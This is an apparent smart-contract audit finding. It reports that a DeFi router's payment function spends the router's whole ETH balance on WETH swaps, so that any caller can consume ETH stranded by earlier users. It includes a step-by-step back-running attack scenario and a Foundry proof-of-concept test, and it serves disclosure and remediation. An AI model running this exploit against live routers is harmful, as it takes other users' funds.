### Title
Implicit ETH auto-consumption in `pay` lets any caller steal ETH left on the router by prior users — (File: metric-periphery/contracts/base/PeripheryPayments.sol)

---

### Summary

`PeripheryPayments::pay` automatically uses the router's **entire** native ETH balance when settling a WETH swap callback, with no accounting for which caller deposited that ETH. Any ETH stranded on the router from a prior multicall (e.g., a user who sent excess `msg.value` but omitted `refundETH()`) is silently consumed by the next caller's WETH swap, resulting in direct ETH theft with zero cost to the attacker.

---

### Finding Description

In `PeripheryPayments::pay`, the WETH branch reads `address(this).balance` and uses it to partially or fully cover the swap payment before pulling from the registered `payer`: [1](#0-0) 

```solidity
} else if (token == WETH) {
    uint256 nativeBalance = address(this).balance;
    if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
    } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
    } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
    }
}
```

The function makes **no distinction** between ETH contributed by the current caller and ETH left by a previous caller. The entire router balance is treated as available for the current swap.

`pay` is invoked from two callback paths:

- `_justPayCallback` (single-hop exact-input/output) [2](#0-1) 
- `_exactOutputIterateCallback` (multi-hop exact-output, final leg) [3](#0-2) 

In both cases, `_getPayer()` returns the original `msg.sender` stored in transient storage at swap entry — but the WETH branch bypasses the payer entirely when `nativeBalance > 0`.

**How ETH accumulates on the router:** `receive()` only accepts ETH from WETH, so the only realistic source is excess `msg.value` sent through payable entry points (`multicall`, `exactInputSingle`, etc.) when the caller omits `refundETH()`. [4](#0-3) 

**Attack scenario (step-by-step):**

1. **User A** calls `multicall{value: 1 ETH}([exactInputSingle(WETH→token, amountIn=0.5 ETH)])` — no `refundETH()` appended. After the transaction, `address(router).balance == 0.5 ETH`.
2. **Attacker** calls `exactInputSingle(WETH→token, amountIn=0.5 ETH)` with `msg.value=0` and **no WETH balance or approval**.
3. The pool calls `metricOmmSwapCallback`; the router calls `pay(WETH, attacker, pool, 0.5 ETH)`.
4. `nativeBalance = 0.5 ETH >= value` → the router wraps User A's 0.5 ETH and transfers it to the pool.
5. Attacker receives tokens. User A loses 0.5 ETH. Attacker spent nothing.

The `receive()` guard prevents the attacker from *directly* depositing ETH, but they need not — they only need to observe stranded ETH and back-run.

---

### Impact Explanation

**Direct loss of user ETH.** Any ETH left on the router between transactions is unconditionally available to the next WETH-swap caller. The attacker pays zero ETH and zero WETH; the victim loses the full stranded amount. This is a concrete, measurable principal loss above Sherlock thresholds for any non-trivial swap size.

---

### Likelihood Explanation

**Medium.** The precondition is a user sending excess `msg.value` in a multicall without appending `refundETH()`. This is a realistic and common user error in Uniswap-style routers (users often over-send ETH to cover slippage). An attacker can passively monitor on-chain router ETH balance or mempool multicall transactions and back-run any that leave a residual balance. No privileged access, no special token, no malicious setup is required.

---

### Recommendation

Track the ETH contributed by the **current top-level call** rather than using the router's total balance. One approach: record `msg.value` at multicall entry in a transient slot and deduct from it inside `pay`, reverting if the current call's ETH budget is exhausted. Alternatively, restrict the WETH branch to only use `msg.value` of the immediate call (passed as a parameter), and always pull the remainder from the payer via `safeTransferFrom`, eliminating the implicit balance read entirely.

---

### Proof of Concept

```solidity
// 1. User A sends excess ETH, forgets refundETH()
vm.prank(userA);
router.multicall{value: 1 ether}(
    [abi.encodeCall(router.exactInputSingle, (
        ExactInputSingleParams({
            pool: wethTokenPool,
            tokenIn: address(weth),
            tokenOut: address(token),
            zeroForOne: true,
            amountIn: 0.5 ether,
            amountOutMinimum: 0,
            recipient: userA,
            deadline: block.timestamp + 1,
            priceLimitX64: 0,
            extensionData: ""
        })
    ))]
);
assertEq(address(router).balance, 0.5 ether); // ETH stranded

// 2. Attacker has no WETH, no ETH, no approval — still executes swap for free
uint256 attackerTokensBefore = token.balanceOf(attacker);
vm.prank(attacker);
router.exactInputSingle{value: 0}(
    ExactInputSingleParams({
        pool: wethTokenPool,
        tokenIn: address(weth),
        tokenOut: address(token),
        zeroForOne: true,
        amountIn: 0.5 ether,   // exactly the stranded amount
        amountOutMinimum: 0,
        recipient: attacker,
        deadline: block.timestamp + 1,
        priceLimitX64: 0,
        extensionData: ""
    })
);

assertGt(token.balanceOf(attacker), attackerTokensBefore); // attacker received tokens
assertEq(address(router).balance, 0);                      // user A's ETH is gone
assertEq(weth.balanceOf(attacker), 0);                     // attacker spent nothing
```

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L73-84)
```text
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
      } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
      }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L192-199)
```text
  function _justPayCallback(int256 amount0Delta, int256 amount1Delta) private {
    pay(
      _getTokenToPay(),
      _getPayer(),
      msg.sender,
      uint256(MetricOmmSwapResults.extractPositiveAmount(amount0Delta, amount1Delta))
    );
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L207-213)
```text
    if (tradesLeft == 0) {
      // forge-lint: disable-next-line(unsafe-typecast)
      uint256 amountIn = uint256(amountToPay);
      if (amountIn > cb.amountInMax) revert InputTooHigh(amountIn, cb.amountInMax);
      _setExactOutputAmountIn(amountIn);
      pay(_getTokenToPay(), _getPayer(), msg.sender, amountIn);
      return;
```
